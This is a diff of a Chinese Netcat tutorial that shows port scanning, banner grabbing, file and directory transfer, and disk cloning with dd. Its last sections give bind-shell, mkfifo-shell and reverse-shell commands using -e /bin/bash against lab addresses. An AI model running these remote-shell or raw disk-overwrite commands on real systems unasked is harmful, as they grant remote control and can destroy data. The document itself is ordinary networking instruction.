@@ -17,8 +17,10 @@ Server B: 192.168.100.101
 
 ### 端口扫描
 
+
 ```
 nc -z -v -n 192.168.100.100 21-25
+
 ```
 
 - 可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.
@@ -28,8 +30,10 @@ nc -z -v -n 192.168.100.100 21-25
 
 一旦你发现开放的端口，你可以容易的使用Netcat 连接服务抓取他们的banner。
 
+
 ```
 nc -v 192.168.100.100 21
+
 ```
 
 #### 消息传送
@@ -38,8 +42,10 @@ nc -v 192.168.100.100 21
 
 SERVER A:
 
+
 ```
 nc -l 1234
+
 ```
 
 Netcat 命令在1567端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。
@@ -47,8 +53,10 @@ Netcat 命令在1567端口启动了一个tcp 服务器，所有的标准输出�
 
 SERVER B:
 
+
 ```
 nc 192.168.100.100 1234
+
 ```
 
 不管你在机器B上键入什么都会出现在机器A上
@@ -60,14 +68,18 @@ nc 192.168.100.100 1234
 
 SERVER A:
 
+
 ```
 nc -l 1234 < file.txt
+
 ```
 
 SERVER B:
 
+
 ```
 nc -n 192.168.100.100 1234 > file.txt
+
 ```
 
 这里我们创建了一个服务器在A上并且重定向Netcat的输入为文件file.txt，那么当任何成功连接到该端口，Netcat会发送file的文件内容。
@@ -80,14 +92,18 @@ B作为Server
 
 SERVER B:
 
+
 ```
 nc -l 1234 > file.txt
+
 ```
 
 SERVER A:
 
+
 ```
 nc 192.168.100.101 1234 < file.txt
+
 ```
 
 #### 目录传输
@@ -98,14 +114,18 @@ nc 192.168.100.101 1234 < file.txt
 
 SERVER A:
 
+
 ```
 tar -cvf – dir_name | nc -l 1234
+
 ```
 
 SERVER B:
 
+
 ```
 nc -n 192.168.159.100 1234 | tar -xvf -
+
 ```
 
 这里在A服务器上，我们创建一个tar归档包并且通过-在控制台重定向它，然后使用管道，重定向给Netcat，Netcat可以通过网络发送它。
@@ -116,15 +136,19 @@ nc -n 192.168.159.100 1234 | tar -xvf -
 
 SERVER A:
 
+
 ```
 tar -cvf – dir_name| bzip2 -z | nc -l 1234
+
 ```
 通过bzip2压缩
 
 SERVER B:
 
+
 ```
 nc -n 192.168.100.100 1234 | bzip2 -d |tar -xvf -
+
 ```
 使用bzip2解压
 
@@ -135,15 +159,19 @@ nc -n 192.168.100.100 1234 | bzip2 -d |tar -xvf -
 
 SERVER A:
 
+
 ```
 nc 192.168.100.101 1234 | mcrypt –flush –bare -F -q -d -m ecb > file.txt
+
 ```
 使用mcrypt工具加密数据。
 
 SERVER B:
 
+
 ```
 mcrypt –flush –bare -F -q -m ecb < file.txt | nc -l 1234
+
 ```
 使用mcrypt工具解密数据。
 
@@ -159,13 +187,17 @@ mcrypt –flush –bare -F -q -m ecb < file.txt | nc -l 1234
 
 SERVER A:
 
+
 ```
 $dd if=/dev/sda | nc -l 1567
+
 ```
 
 SERVER B:
+
 ```
 $nc -n 192.168.100.100 1567 | dd of=/dev/sda
+
 ```
 
 ####打开一个shell
@@ -176,14 +208,18 @@ $nc -n 192.168.100.100 1567 | dd of=/dev/sda
 
 SERVER A:
 
+
 ```
 $nc -l 1567 -e /bin/bash -i
+
 ```
 
 SERVER B:
 
+
 ```
 $nc 192.168.100.100 1567
+
 ```
 
 这里我们已经创建了一个Netcat服务器并且表示当它连接成功时执行/bin/bash
@@ -192,8 +228,10 @@ $nc 192.168.100.100 1567
 
 SERVER A:
 
+
 ```
 $mkfifo /tmp/tmp_fifo$cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc -l 1567 > /tmp/tmp_fifo
+
 ```
 
 这里我们创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2>&1中。是用来重定向标准错误输出和标准输出，然后管道到Netcat 运行的端口1567上。至此，我们已经把Netcat的输出重定向到fifo文件中。
@@ -215,16 +253,20 @@ $mkfifo /tmp/tmp_fifo$cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc -l 1567 > /tmp/tm
 
 服务端
 
+
 ```
 $nc -l 1567
+
 ```
 
 在客户端，简单地告诉Netcat在连接完成后，执行shell。
 
 客户端
 
+
 ```
 $nc 192.168.100.100 -e /bin/bash
+
 ```
 
 现在，什么是反向shell的特别之处呢
@@ -237,14 +279,18 @@ $nc 192.168.100.100 -e /bin/bash
 
 服务器端
 
+
 ```
 $nc -l 1567
+
 ```
 
 客户端
 
+
 ```
 $nc 172.31.100.7 1567 -p 25
+
 ```
 
 使用1024以内的端口需要root权限。
@@ -257,14 +303,18 @@ $nc 172.31.100.7 1567 -p 25
 
 服务器端
 
+
 ```
 $nc -u -l 1567 < file.txt
+
 ```
 
 客户端
 
+
 ```
 $nc -u 172.31.100.7 1567 -s 172.31.100.5 > file.txt
+
 ```
 
 该命令将绑定地址172.31.100.5。
